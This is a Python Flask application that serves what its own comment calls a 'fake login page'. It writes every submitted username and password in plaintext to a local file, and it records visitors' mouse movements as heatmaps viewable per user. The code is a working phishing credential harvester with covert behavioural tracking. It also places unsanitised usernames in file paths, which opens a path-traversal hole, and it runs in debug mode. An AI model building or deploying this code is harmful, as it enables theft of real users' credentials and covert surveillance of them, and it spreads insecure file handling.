from flask import Flask, render_template, request, jsonify, redirect, url_for
import json
import matplotlib.pyplot as plt
import seaborn as sns
import numpy as np
import os
import datetime

app = Flask(__name__)

# Create directories for data and images if they don't exist
os.makedirs('static/heatmaps', exist_ok=True)
os.makedirs('data', exist_ok=True)

# Route for the fake login page
@app.route('/')
def login_page():
    return render_template('login.html')

# Handle form submissions
@app.route('/submit', methods=['POST'])
def handle_login():
    username = request.form.get('username')
    password = request.form.get('password')

    # Log the collected data
    with open('data/collected_data.txt', 'a') as f:
        f.write(f"Username: {username}, Password: {password}\n")

    # Redirect to the submit page with the username parameter
    return redirect(url_for('submit_page', username=username))

# New route for the submit page
@app.route('/submit')
def submit_page():
    username = request.args.get('username', 'user')
    return render_template('submit.html', username=username)

# Route for dashboard
@app.route('/dashboard')
def dashboard():
    username = request.args.get('username', 'user')
    return render_template('dashboard.html', username=username)

# Endpoint to receive mouse data
@app.route('/mouse-data', methods=['POST'])
def receive_mouse_data():
    data = request.get_json()
    username = data.get('username', 'unknown_user')
    mouse_data = data.get('mouseData', [])

    # Save mouse data to a file
    file_name = f"data/{username}_mouse_data.json"
    with open(file_name, 'w') as f:
        json.dump(mouse_data, f, indent=4)

    # Generate a heatmap
    heatmap_path = generate_heatmap(mouse_data, username)
    return jsonify({"message": "Mouse data recorded!", "heatmap_path": heatmap_path}), 200

def generate_heatmap(mouse_data, username):
    # Extract coordinates for heatmap
    x_coords = [entry['x'] for entry in mouse_data if entry['type'] == 'move']
    y_coords = [entry['y'] for entry in mouse_data if entry['type'] == 'move']

    if not x_coords or not y_coords:
        return None

    # Create a 2D histogram for the heatmap
    heatmap, x_edges, y_edges = np.histogram2d(x_coords, y_coords, bins=(50, 50))

    # Plot the heatmap
    plt.figure(figsize=(8, 6))
    sns.heatmap(heatmap.T, cmap='coolwarm', cbar=True, xticklabels=False, yticklabels=False)
    plt.title(f"Mouse Movement Heatmap - {username}")
    plt.xlabel('X Coordinate')
    plt.ylabel('Y Coordinate')

    # Create a timestamp for unique filenames
    timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
    
    # Save the heatmap
    output_file = f"static/heatmaps/{username}_{timestamp}_heatmap.png"
    plt.savefig(output_file)
    plt.close()
    
    # Return the relative path to the heatmap
    return output_file.replace("static/", "")

# Route to show all heatmaps
@app.route('/heatmaps')
def show_heatmaps():
    heatmaps = []
    for filename in os.listdir('static/heatmaps'):
        if filename.endswith('.png'):
            parts = filename.split('_')
            username = parts[0]
            timestamp = parts[1]
            formatted_time = datetime.datetime.strptime(timestamp, "%Y%m%d%H%M%S").strftime("%Y-%m-%d %H:%M:%S")
            heatmaps.append({
                'username': username,
                'timestamp': formatted_time,
                'path': f'heatmaps/{filename}'
            })
    
    # Sort heatmaps by timestamp (newest first)
    heatmaps.sort(key=lambda x: x['path'], reverse=True)
    
    return render_template('heatmaps.html', heatmaps=heatmaps)

# Route to show a specific user's heatmaps
@app.route('/user-heatmaps/<username>')
def user_heatmaps(username):
    heatmaps = []
    for filename in os.listdir('static/heatmaps'):
        if filename.startswith(f"{username}_") and filename.endswith('.png'):
            parts = filename.split('_')
            timestamp = parts[1]
            formatted_time = datetime.datetime.strptime(timestamp, "%Y%m%d%H%M%S").strftime("%Y-%m-%d %H:%M:%S")
            heatmaps.append({
                'username': username,
                'timestamp': formatted_time,
                'path': f'heatmaps/{filename}'
            })
    
    # Sort heatmaps by timestamp (newest first)
    heatmaps.sort(key=lambda x: x['path'], reverse=True)
    
    return render_template('user_heatmaps.html', heatmaps=heatmaps, username=username)

if __name__ == '__main__':
    app.run(debug=True)